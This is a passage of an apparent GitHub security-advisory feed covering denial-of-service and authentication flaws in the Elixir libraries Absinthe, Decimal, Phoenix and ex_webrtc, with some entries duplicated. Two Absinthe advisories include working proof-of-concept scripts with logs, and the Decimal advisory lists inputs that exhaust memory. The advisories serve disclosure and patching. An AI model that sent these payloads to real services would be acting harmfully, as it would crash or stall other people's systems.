<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42794">https://nvd.nist.gov/vuln/detail/CVE-2026-42794</a></li>
<li><a href="https://github.com/absinthe-graphql/absinthe_plug/issues/275">https://github.com/absinthe-graphql/absinthe_plug/issues/275</a></li>
<li><a href="https://github.com/absinthe-graphql/absinthe_plug/commit/23a0d5658d32420086711adf4ce8f05febb09963">https://github.com/absinthe-graphql/absinthe_plug/commit/23a0d5658d32420086711adf4ce8f05febb09963</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-42794.html">https://cna.erlef.org/cves/CVE-2026-42794.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-42794">https://osv.dev/vulnerability/EEF-CVE-2026-42794</a></li>
<li><a href="https://github.com/advisories/GHSA-c62g-j346-39v5">https://github.com/advisories/GHSA-c62g-j346-39v5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c62g-j346-39v5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-08T18:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[absinthe] Absinthe: Quadratic fragment-name uniqueness check]]></title>
        <id>https://github.com/advisories/GHSA-9mhv-8h52-q7q2</id>
        <link href="https://github.com/advisories/GHSA-9mhv-8h52-q7q2"/>
        <updated>2026-05-14T13:08:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An unauthenticated attacker can stall an Absinthe-backed GraphQL endpoint by submitting a query that contains many fragment definitions. The fragment-name uniqueness validation phase is O(N²) in the number of fragments, so a single modestly-sized request burns seconds of CPU per worker, and sustained traffic exhausts the worker pool (denial of service).</p>
<p>Introduced like with <a href="https://github.com/absinthe-graphql/absinthe/commit/0b46e3bcc06c0d3797bacd64761b908a84646c1d#diff-e540120c6a98cc1013be110d08e9d029511b9aabd26ad5f7f643c36834caac14">https://github.com/absinthe-graphql/absinthe/commit/0b46e3bcc06c0d3797bacd64761b908a84646c1d#diff-e540120c6a98cc1013be110d08e9d029511b9aabd26ad5f7f643c36834caac14</a></p>
<h3 id="details">Details</h3>
<p><code>Absinthe.Phase.Document.Validation.UniqueFragmentNames</code> (<code>lib/absinthe/phase/document/validation/unique_fragment_names.ex:14-40</code>) walks every fragment in <code>input.fragments</code> via <code>run/2</code>, calling <code>process/2</code> on each one. <code>process/2</code> then calls <code>duplicate?/2</code>, which evaluates <code>Enum.count(fragments, fn f -&gt; f.name == name end)</code> — a full linear scan of the fragment list — for every individual fragment. The result is <code>N · N</code> name comparisons per document.</p>
<p><code>input.fragments</code> is built directly from the GraphQL query text the caller sends at the head of the pipeline, so <code>N</code> is attacker-controlled. A minimum-size fragment definition (<code>fragment a on T{f}</code>) is roughly 16 bytes, so a ~1 MB document carries ~60 000 fragments and forces ~3.6 × 10⁹ comparisons inside this one phase. Phoenix's default 8 MB body limit allows substantially larger blow-ups if operators have not lowered it. Nothing in this module caps <code>N</code>.</p>
<p>The fix is to aggregate names once per call rather than re-scanning per fragment, e.g.:</p>
<pre><code class="language-elixir">dups =
  for {name, k} &lt;- Enum.frequencies_by(input.fragments, &amp; &amp;1.name),
      k &gt; 1,
      into: MapSet.new(),
      do: name
</code></pre>
<p>and then check <code>MapSet.member?(dups, fragment.name)</code> inside <code>process/2</code>. That collapses the phase to O(N).</p>
<h3 id="poc">PoC</h3>
<p>A standalone script that builds a GraphQL document with a large number of minimal fragment definitions, feeds it through Absinthe's pipeline, and times the <code>UniqueFragmentNames</code> phase is attached at the end of this report. Running it shows the validation time growing quadratically with the fragment count.</p>
<h3 id="impact">Impact</h3>
<p>Algorithmic complexity / denial-of-service. Any service that exposes an Absinthe GraphQL endpoint to untrusted callers is affected: a single unauthenticated POST containing many fragment definitions pins a worker process for seconds, and modest sustained traffic exhausts the request-handling pool. No authentication, schema knowledge, or special configuration is required — only the ability to send a GraphQL query large enough to contain many fragments, which is permitted by Phoenix's default body-size limit.</p>
<h2 id="scripts-and-logs">Scripts and Logs</h2>
<pre><code class="language-elixir"># Verifies: Quadratic fragment-name uniqueness check

Mix.install([
  {:absinthe, "~&gt; 1.7"},
  {:absinthe_plug, "~&gt; 1.5"},
  {:bandit, "~&gt; 1.0"},
  {:plug, "~&gt; 1.15"},
  {:jason, "~&gt; 1.4"},
  {:req, "~&gt; 0.5"}
])

defmodule VictimSchema do
  use Absinthe.Schema

  object :thing do
    field :f, :string
  end

  query do
    field :thing, :thing do
      resolve(fn _, _ -&gt; {:ok, %{f: "x"}} end)
    end
  end
end

defmodule VictimRouter do
  use Plug.Router

  plug :match

  plug Plug.Parsers,
    parsers: [:json],
    pass: ["*/*"],
    json_decoder: Jason

  plug :dispatch

  forward "/graphql",
    to: Absinthe.Plug,
    init_opts: [schema: VictimSchema]

  match _ do
    send_resp(conn, 404, "nope")
  end
end

port = 47817
{:ok, _} = Bandit.start_link(plug: VictimRouter, port: port)

n = 20_000

fragments =
  1..n
  |&gt; Enum.map(fn i -&gt; "fragment f#{i} on Thing{f}" end)
  |&gt; Enum.join(" ")

query = "{ thing { f } } " &lt;&gt; fragments

IO.puts(
  "Sending GraphQL document with #{n} fragment definitions (~#{div(byte_size(query), 1024)} KB) to 127.0.0.1:#{port}"
)

{us, response} =
  :timer.tc(fn -&gt;
    Req.post!("http://127.0.0.1:#{port}/graphql",
      json: %{query: query},
      receive_timeout: 600_000,
      retry: false
    )
  end)

ms = div(us, 1000)
IO.puts("HTTP response status: #{response.status}")
IO.puts("Total request elapsed (validation-dominated): #{ms} ms")

result =
  if ms &gt; 1000 do
    "VERIFIED: ~#{n} fragments in one unauthenticated request forced #{ms} ms of CPU in Absinthe's UniqueFragmentNames phase (quadratic check)."
  else
    "NOT VERIFIED: elapsed #{ms} ms below DoS threshold"
  end

IO.puts(result)
</code></pre>
<h3 id="logs">Logs</h3>
<pre><code class="language-logs">HTTP response status: 200
Total request elapsed (validation-dominated): 15451 ms
VERIFIED: ~20000 fragments in one unauthenticated request forced 15451 ms of CPU in Absinthe's UniqueFragmentNames phase (quadratic check).
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/absinthe-graphql/absinthe/security/advisories/GHSA-9mhv-8h52-q7q2">https://github.com/absinthe-graphql/absinthe/security/advisories/GHSA-9mhv-8h52-q7q2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43967">https://nvd.nist.gov/vuln/detail/CVE-2026-43967</a></li>
<li><a href="https://github.com/absinthe-graphql/absinthe/commit/223600c520493dcaf95080af552c413099f92c9d">https://github.com/absinthe-graphql/absinthe/commit/223600c520493dcaf95080af552c413099f92c9d</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-43967.html">https://cna.erlef.org/cves/CVE-2026-43967.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-43967">https://osv.dev/vulnerability/EEF-CVE-2026-43967</a></li>
<li><a href="https://github.com/advisories/GHSA-9mhv-8h52-q7q2">https://github.com/advisories/GHSA-9mhv-8h52-q7q2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9mhv-8h52-q7q2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T13:08:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[absinthe] Absinthe: Unbounded atom creation from parsed directive name]]></title>
        <id>https://github.com/advisories/GHSA-qf4g-9fqq-mmm7</id>
        <link href="https://github.com/advisories/GHSA-qf4g-9fqq-mmm7"/>
        <updated>2026-05-14T13:08:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When Absinthe parses a GraphQL SDL document, every <code>directive @&lt;name&gt;</code> definition is converted into a freshly created atom without any allow-list or length cap. Because atoms are never garbage-collected and the BEAM has a hard ~1,048,576 atom-table limit, any application that feeds attacker-controlled SDL through Absinthe's parser can be crashed (whole VM termination) by submitting a document containing enough unique directive names.</p>
<p>Introduced in <a href="https://github.com/absinthe-graphql/absinthe/commit/d0eae7764520d4e8e5dfff619068c0de911aec33">https://github.com/absinthe-graphql/absinthe/commit/d0eae7764520d4e8e5dfff619068c0de911aec33</a></p>
<h3 id="details">Details</h3>
<p>In <code>lib/absinthe/language/directive_definition.ex:27</code>, the <code>Blueprint.from_ast/2</code> conversion does:</p>
<pre><code class="language-elixir">Macro.underscore(node.name) |&gt; String.to_atom()
</code></pre>
<p><code>node.name</code> is taken verbatim from the parsed GraphQL document, so the atom is created before the directive has been validated against any known schema. There is no use of <code>String.to_existing_atom/1</code>, no length cap, and no allow-list. Each unique directive name in the input permanently consumes one slot in the global atom table.</p>
<p>Any code path that runs <code>Absinthe.Phase.Parse</code> (or any equivalent that ultimately calls <code>Absinthe.Blueprint.Draft.convert/2</code> on a parsed <code>DirectiveDefinition</code> node) on untrusted text is exposed — for example, a schema-upload endpoint, a federation gateway that ingests remote SDL, an introspection-to-SDL converter, or any developer tool that runs the parser over user-supplied documents. An attacker only needs to submit one (or a handful of) SDL documents that together contain ~1M unique <code>directive @&lt;random&gt;</code> definitions to exhaust the atom table and crash the BEAM.</p>
<p>The same vulnerablity was found in these files as well:</p>
<ul>
<li><code>lib/absinthe/language/enum_type_definition.ex:23</code></li>
<li><code>lib/absinthe/language/field_definition.ex:27</code></li>
<li><code>lib/absinthe/language/input_object_type_definition.ex:24</code></li>
<li><code>lib/absinthe/language/input_value_definition.ex:31</code></li>
<li><code>lib/absinthe/language/interface_type_definition.ex:26</code></li>
<li><code>lib/absinthe/language/object_type_definition.ex:27</code></li>
<li><code>lib/absinthe/language/scalar_type_definition.ex:23</code></li>
<li><code>lib/absinthe/language/union_type_definition.ex:24</code></li>
<li>maybe others too.</li>
</ul>
<p>Please do a search&amp;replace in the whole project.</p>
<h3 id="poc">PoC</h3>
<p>A script that parses a generated SDL document containing many unique <code>directive @&lt;random&gt;</code> definitions through Absinthe and demonstrates unbounded atom-table growth (eventually crashing the VM) is attached at the end of this report.</p>
<h3 id="impact">Impact</h3>
<p>This is an unauthenticated denial-of-service vulnerability (atom-table exhaustion leading to BEAM VM crash) affecting any application that passes untrusted GraphQL SDL through Absinthe's parser. The crash takes down the entire Erlang node, not just the request handler, so all unrelated workloads sharing the VM are also impacted. The only precondition is that attacker-controlled text reaches the SDL parser; no authentication, schema privileges, or query execution are required.</p>
<h2 id="scripts-and-logs">Scripts and Logs</h2>
<pre><code class="language-elixir"># Verifies: Unbounded atom creation from parsed directive name

Mix.install([
  {:absinthe, "~&gt; 1.7"},
  {:absinthe_plug, "~&gt; 1.5"},
  {:bandit, "~&gt; 1.5"},
  {:plug, "~&gt; 1.16"},
  {:jason, "~&gt; 1.4"},
  {:req, "~&gt; 0.5"}
])

# Minimal Absinthe schema -- the only thing it needs to do is exist
# so that Absinthe.Plug will parse incoming GraphQL documents.
defmodule DemoSchema do
  use Absinthe.Schema

  query do
    field :hello, :string do
      resolve fn _, _, _ -&gt; {:ok, "world"} end
    end
  end
end

# Standard absinthe_plug HTTP entry point. This is the public
# trust boundary: anyone who can reach the server can POST a
# GraphQL document, which Absinthe will parse and lower into a
# Blueprint -- the path that mints atoms from directive names.
defmodule Router do
  use Plug.Router

  plug Plug.Parsers,
    parsers: [:urlencoded, :multipart, :json, Absinthe.Plug.Parser],
    pass: ["*/*"],
    json_decoder: Jason

  plug :match
  plug :dispatch

  forward "/graphql", to: Absinthe.Plug, init_opts: [schema: DemoSchema]

  match _ do
    send_resp(conn, 404, "not found")
  end
end

port = 41_731
{:ok, server_pid} = Bandit.start_link(plug: Router, port: port, startup_log: false)

base = "http://127.0.0.1:#{port}/graphql"

# Attacker-controlled GraphQL document: a flood of unique directive
# definitions plus a trivial operation. Absinthe parses the whole
# document and converts each DirectiveDefinition AST node into a
# Blueprint, calling String.to_atom/1 on every directive name along
# the way (lib/absinthe/language/directive_definition.ex:27).
n = 5_000
random_tag = :crypto.strong_rand_bytes(4) |&gt; Base.encode16(case: :lower)

directives =
  1..n
  |&gt; Enum.map_join("\n", fn i -&gt;
    "directive @atomdos_#{random_tag}_#{i} on FIELD"
  end)

document = directives &lt;&gt; "\nquery { hello }\n"

before_atoms = :erlang.system_info(:atom_count)

response =
  Req.post!(base,
    headers: [{"content-type", "application/graphql"}],
    body: document,
    receive_timeout: 60_000
  )

after_atoms = :erlang.system_info(:atom_count)
delta = after_atoms - before_atoms

IO.puts("HTTP status:        #{response.status}")
IO.puts("payload directives: #{n}")
IO.puts("atom_count before:  #{before_atoms}")
IO.puts("atom_count after:   #{after_atoms}")
IO.puts("delta:              #{delta}")

# Tear the listener down so the script can be re-run cleanly.
Process.exit(server_pid, :normal)

result =
  if delta &gt;= n do
    "VERIFIED: a single HTTP POST to /graphql minted #{delta} new atoms (&gt;= #{n} attacker-supplied directive names); BEAM atom table (~1,048,576 cap) is exhaustible by an outside attacker via Absinthe.Plug -&gt; Absinthe.Language.DirectiveDefinition."
  else
    "NOT VERIFIED: only #{delta} new atoms were created for #{n} unique directive names sent over HTTP."
  end

IO.puts(result)
</code></pre>
<h3 id="logs">Logs</h3>
<pre><code class="language-logs">HTTP status:        200
payload directives: 5000
atom_count before:  26049
atom_count after:   32581
delta:              6532
VERIFIED: a single HTTP POST to /graphql minted 6532 new atoms (&gt;= 5000 attacker-supplied directive names)
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/absinthe-graphql/absinthe/security/advisories/GHSA-qf4g-9fqq-mmm7">https://github.com/absinthe-graphql/absinthe/security/advisories/GHSA-qf4g-9fqq-mmm7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42793">https://nvd.nist.gov/vuln/detail/CVE-2026-42793</a></li>
<li><a href="https://github.com/absinthe-graphql/absinthe/commit/dd842b938e3823f345c10416914ffab5d5536838">https://github.com/absinthe-graphql/absinthe/commit/dd842b938e3823f345c10416914ffab5d5536838</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-42793.html">https://cna.erlef.org/cves/CVE-2026-42793.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-42793">https://osv.dev/vulnerability/EEF-CVE-2026-42793</a></li>
<li><a href="https://github.com/advisories/GHSA-qf4g-9fqq-mmm7">https://github.com/advisories/GHSA-qf4g-9fqq-mmm7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qf4g-9fqq-mmm7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T13:08:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[decimal] Decimal: Unbounded exponent in `Decimal.new` enables unauthenticated DoS]]></title>
        <id>https://github.com/advisories/GHSA-rhv4-8758-jx7v</id>
        <link href="https://github.com/advisories/GHSA-rhv4-8758-jx7v"/>
        <updated>2026-05-12T15:09:21.000Z</updated>
        <content type="html"><![CDATA[<p>Summary
<code>decimal</code> doesn't bound the exponent on parsed input, so something like <code>"1e10000000"</code> is parsed fine but then explodes the memory to more than 7GB if you run e.g. <code>Decimal.add(Decimal.parse("1e10000000"), 1)</code> because for positive <code>exp</code>, the function tail-recurses with <code>coef * 10</code> and <code>exp - 1</code> per iteration, growing the bignum coefficient by one digit each step. In the worst case, one request is enough to OOM the BEAM.</p>
<h3 id="details">Details</h3>
<p><code>Decimal.new/parse/cast</code> happily store huge exponents. After that, a bunch of core paths allocate proportional to <code>exp</code>:</p>
<ul>
<li><code>add/sub/div</code> go through <code>add_align</code>, which calls <code>pow10(exp1 - exp2)</code> and builds a giant bignum (lib/decimal.ex:1734-1738, 1827).</li>
<li><code>to_string/2</code> with <code>:normal</code> (also <code>:xsd</code> and the <code>String.Chars</code> impl) does <code>:lists.duplicate(exp, ?0)</code> (lib/decimal.ex:1506, 1513).</li>
<li><code>to_integer/1</code> recurses <code>coef * 10</code>, <code>exp - 1</code> once per unit of <code>exp</code> (lib/decimal.ex:1603-1605).</li>
<li><code>round/3</code> does the same <code>:lists.duplicate</code> trick on the exp difference (lib/decimal.ex:1850, 1874).</li>
<li><code>compare/3</code> with a threshold argument loops back into <code>add</code>/<code>sub</code>, so it's vulnerable too (lib/decimal.ex:331-332).</li>
</ul>
<h3 id="poc">PoC</h3>
<p>Any of these will hang or OOM the BEAM:</p>
<pre><code class="language-elixir">Decimal.add(Decimal.new("1"), Decimal.new("1e1000000000"))
Decimal.to_string(Decimal.new("1e1000000000"), :normal)
Decimal.to_integer(Decimal.new("1e1000000000"))
Decimal.round(Decimal.new("1e1000000000"))
</code></pre>
<h3 id="impact">Impact</h3>
<p>Unauthenticated remote DoS. Anything that takes a user-supplied decimal (JSON, form field, Ecto <code>:decimal</code> field — basically everywhere) and then does arithmetic, rounding, <code>to_integer</code>, or <code>to_string</code> on it is exposed. One request can kill the node with a Out-of-Memory exception.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ericmj/decimal/security/advisories/GHSA-rhv4-8758-jx7v">https://github.com/ericmj/decimal/security/advisories/GHSA-rhv4-8758-jx7v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32686">https://nvd.nist.gov/vuln/detail/CVE-2026-32686</a></li>
<li><a href="https://github.com/ericmj/decimal/commit/6a523f3a73b8c9974540e21c7aa88f1258bb35ae">https://github.com/ericmj/decimal/commit/6a523f3a73b8c9974540e21c7aa88f1258bb35ae</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-32686.html">https://cna.erlef.org/cves/CVE-2026-32686.html</a></li>
<li><a href="https://github.com/ericmj/decimal/releases/tag/v3.0.0">https://github.com/ericmj/decimal/releases/tag/v3.0.0</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-32686">https://osv.dev/vulnerability/EEF-CVE-2026-32686</a></li>
<li><a href="https://github.com/advisories/GHSA-rhv4-8758-jx7v">https://github.com/advisories/GHSA-rhv4-8758-jx7v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rhv4-8758-jx7v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-12T15:09:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phoenix] Phoenix: Long-poll NDJSON body splitting causes large memory allocation]]></title>
        <id>https://github.com/advisories/GHSA-628h-q48j-jr6q</id>
        <link href="https://github.com/advisories/GHSA-628h-q48j-jr6q"/>
        <updated>2026-05-08T20:24:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An unauthenticated denial-of-service vulnerability in Phoenix's long-poll transport allows a remote client to allocate a large amount of memory with a HTTP request. A handful of concurrent requests can be sufficient to let the node run out of memory.</p>
<p>See also <a href="https://cna.erlef.org/cves/CVE-2026-32689.html">https://cna.erlef.org/cves/CVE-2026-32689.html</a>.</p>
<h3 id="details">Details</h3>
<p>The unoptimised code path exists on the <code>application/x-ndjson</code> POST handling in the LongPoll transport. The endpoint requires only a session token, which any client can obtain by issuing a GET to the same URL with a matching <code>Origin</code> header, so exploitation is unauthenticated.</p>
<h3 id="impact">Impact</h3>
<p>Anyone who runs a LiveView app with a public Longpoll socket or uses a <code>Phoenix.Socket</code> with longpoll option.
Longpoll has been enabled for newly generated Phoenix projects since Phoenix 1.7.11.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phoenixframework/phoenix/security/advisories/GHSA-628h-q48j-jr6q">https://github.com/phoenixframework/phoenix/security/advisories/GHSA-628h-q48j-jr6q</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32689">https://nvd.nist.gov/vuln/detail/CVE-2026-32689</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/1a67c61ff9ce0a7711662ac7354861917a7c80f7">https://github.com/phoenixframework/phoenix/commit/1a67c61ff9ce0a7711662ac7354861917a7c80f7</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/912ea181fd247c21dbcc49fb97d0053b947d81bf">https://github.com/phoenixframework/phoenix/commit/912ea181fd247c21dbcc49fb97d0053b947d81bf</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-32689.html">https://cna.erlef.org/cves/CVE-2026-32689.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-32689">https://osv.dev/vulnerability/EEF-CVE-2026-32689</a></li>
<li><a href="https://github.com/advisories/GHSA-628h-q48j-jr6q">https://github.com/advisories/GHSA-628h-q48j-jr6q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-628h-q48j-jr6q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-08T20:24:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phoenix] Phoenix: Long-poll NDJSON body splitting causes large memory allocation]]></title>
        <id>https://github.com/advisories/GHSA-628h-q48j-jr6q</id>
        <link href="https://github.com/advisories/GHSA-628h-q48j-jr6q"/>
        <updated>2026-05-08T20:24:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An unauthenticated denial-of-service vulnerability in Phoenix's long-poll transport allows a remote client to allocate a large amount of memory with a HTTP request. A handful of concurrent requests can be sufficient to let the node run out of memory.</p>
<p>See also <a href="https://cna.erlef.org/cves/CVE-2026-32689.html">https://cna.erlef.org/cves/CVE-2026-32689.html</a>.</p>
<h3 id="details">Details</h3>
<p>The unoptimised code path exists on the <code>application/x-ndjson</code> POST handling in the LongPoll transport. The endpoint requires only a session token, which any client can obtain by issuing a GET to the same URL with a matching <code>Origin</code> header, so exploitation is unauthenticated.</p>
<h3 id="impact">Impact</h3>
<p>Anyone who runs a LiveView app with a public Longpoll socket or uses a <code>Phoenix.Socket</code> with longpoll option.
Longpoll has been enabled for newly generated Phoenix projects since Phoenix 1.7.11.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phoenixframework/phoenix/security/advisories/GHSA-628h-q48j-jr6q">https://github.com/phoenixframework/phoenix/security/advisories/GHSA-628h-q48j-jr6q</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32689">https://nvd.nist.gov/vuln/detail/CVE-2026-32689</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/1a67c61ff9ce0a7711662ac7354861917a7c80f7">https://github.com/phoenixframework/phoenix/commit/1a67c61ff9ce0a7711662ac7354861917a7c80f7</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/912ea181fd247c21dbcc49fb97d0053b947d81bf">https://github.com/phoenixframework/phoenix/commit/912ea181fd247c21dbcc49fb97d0053b947d81bf</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-32689.html">https://cna.erlef.org/cves/CVE-2026-32689.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-32689">https://osv.dev/vulnerability/EEF-CVE-2026-32689</a></li>
<li><a href="https://github.com/advisories/GHSA-628h-q48j-jr6q">https://github.com/advisories/GHSA-628h-q48j-jr6q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-628h-q48j-jr6q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-08T20:24:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ex_webrtc] ex_webrtc client-role handshake is missing DTLS peer fingerprint validation]]></title>
        <id>https://github.com/advisories/GHSA-qwfw-ggxw-577c</id>
        <link href="https://github.com/advisories/GHSA-qwfw-ggxw-577c"/>
        <updated>2026-05-15T23:46:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Missing DTLS peer certificate fingerprint validation in the DTLS client (active) role removes one side of WebRTC's mutual authentication. The bug is not independently exploitable for media interception in standard deployments, but enables a full man-in-the-middle attack when chained with insecure signalling or a peer with similar validation gaps.</p>
<h3 id="details">Details</h3>
<p><code>ex_webrtc</code> validates the DTLS peer's certificate fingerprint against the value advertised in the SDP offer/answer when acting as the DTLS server (passive role). When acting as the DTLS client (active role) -- the default when answering a remote offer with <code>a=setup:actpass</code>, which is what browsers always send -- the fingerprint check was skipped on the handshake-completion code path that returns no outgoing packets. This is the most common deployment mode (e.g., an SFU or media server answering a browser's offer).</p>
<p>All released versions prior to 0.15.1 and 0.16.1 are affected. No backports to older lines are planned -- users should upgrade to 0.15.1 or 0.16.1.</p>
<h3 id="impact">Impact</h3>
<p>The bug eliminates one half of WebRTC's mutual DTLS authentication. The security of the media and data-channel encryption then rests entirely on the remote peer's fingerprint check.</p>
<p>On its own, the bug does <strong>not</strong> allow:</p>
<ul>
<li>Passive eavesdropping on SRTP media.</li>
<li>A network-positioned attacker to intercept media against a standards-compliant browser peer over a TLS-protected signalling channel -- the browser's fingerprint check prevents the second leg of the MITM from succeeding.</li>
</ul>
<p>The bug <strong>does</strong> enable a full MITM on media and data channels when combined with any of:</p>
<ul>
<li>Insecure signalling (HTTP / plain WebSocket) allowing SDP rewrite in transit.</li>
<li>A compromised or malicious signalling server.</li>
<li>A peer implementation with a similar fingerprint-validation gap.</li>
</ul>
<p>Both audio/video media (SRTP) and data channels (SCTP-over-DTLS) are affected.</p>
<h3 id="patches">Patches</h3>
<ul>
<li><code>0.15.1</code> (for the 0.15.x line)</li>
<li><code>0.16.1</code> (for the 0.16.x line)</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>None. Upgrade is required.</p>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/issues/249">Issue</a></li>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/pull/250">PR</a></li>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/releases/tag/v0.15.1">Release 0.15.1</a></li>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/releases/tag/v0.16.1">Release 0.16.1</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/security/advisories/GHSA-qwfw-ggxw-577c">https://github.com/elixir-webrtc/ex_webrtc/security/advisories/GHSA-qwfw-ggxw-577c</a></li>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/issues/249">https://github.com/elixir-webrtc/ex_webrtc/issues/249</a></li>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/pull/250">https://github.com/elixir-webrtc/ex_webrtc/pull/250</a></li>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/commit/658c63221a869fb12bb9989599c3688751b0531b">https://github.com/elixir-webrtc/ex_webrtc/commit/658c63221a869fb12bb9989599c3688751b0531b</a></li>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/releases/tag/v0.15.1">https://github.com/elixir-webrtc/ex_webrtc/releases/tag/v0.15.1</a></li>
<li><a href="https://github.com/elixir-webrtc/ex_webrtc/releases/tag/v0.16.1">https://github.com/elixir-webrtc/ex_webrtc/releases/tag/v0.16.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-44700">https://nvd.nist.gov/vuln/detail/CVE-2026-44700</a></li>
<li><a href="https://github.com/advisories/GHSA-qwfw-ggxw-577c">https://github.com/advisories/GHSA-qwfw-ggxw-577c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qwfw-ggxw-577c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-08T17:08:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ex_webrtc] ex_webrtc client-role handshake is missing DTLS peer fingerprint validation]]></title>
        <id>https://github.com/advisories/GHSA-qwfw-ggxw-577c</id>
        <link href="https://github.com/advisories/GHSA-qwfw-ggxw-577c"/>
        <updated>2026-05-15T23:46:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Missing DTLS peer certificate fingerprint validation in the DTLS client (active) role removes one side of WebRTC's mutual authentication. The bug is not independently exploitable for media interception in standard deployments, but enables a full man-in-the-middle attack when chained with insecure signalling or a peer with similar validation gaps.</p>
<h3 id="details">Details</h3>
<p><code>ex_webrtc</code> validates the DTLS peer's certificate fingerprint against the value advertised in the SDP offer/answer when acting as the DTLS server (passive role). When acting as the DTLS client (active role) -- the default when answering a remote offer with <code>a=setup:actpass</code>, which is what browsers always send -- the fingerprint check was skipped on the handshake-completion code path that returns no outgoing packets. This is the most common deployment mode (e.g., an SFU or media server answering a browser's offer).</p>
<p>All released versions prior to 0.15.1 and 0.16.1 are affected. No backports to older lines are planned -- users should upgrade to 0.15.1 or 0.16.1.</p>
<h3 id="impact">Impact</h3>
<p>The bug eliminates one half of WebRTC's mutual DTLS authentication. The security of the media and data-channel encryption then rests entirely on the remote peer's fingerprint check.</p>
<p>On its own, the bug does <strong>not</strong> allow:</p>
<ul>
<li>Passive eavesdropping on SRTP media.</li>
<li>A network-positioned attacker to intercept media against a standards-compliant browser peer over a TLS-protected signalling channel -- the browser's fingerprint check prevents the second leg of the MITM from succeeding.</li>
</ul>
<p>The bug <strong>does</strong> enable a full MITM on media and data channels when combined with any of:</p>
<ul>
<li>Insecure signalling (HTTP / plain WebSocket) allowing SDP rewrite in transit.</li>
<li>A compromised or malicious signalling server.</li>
<li>A peer implementation with a similar fingerprint-validation gap.</li>
</ul>
<p>Both audio/video media (SRTP) and data channels (SCTP-over-DTLS) are affected.</p>
<h3 id="patches">Patches</h3>
<ul>
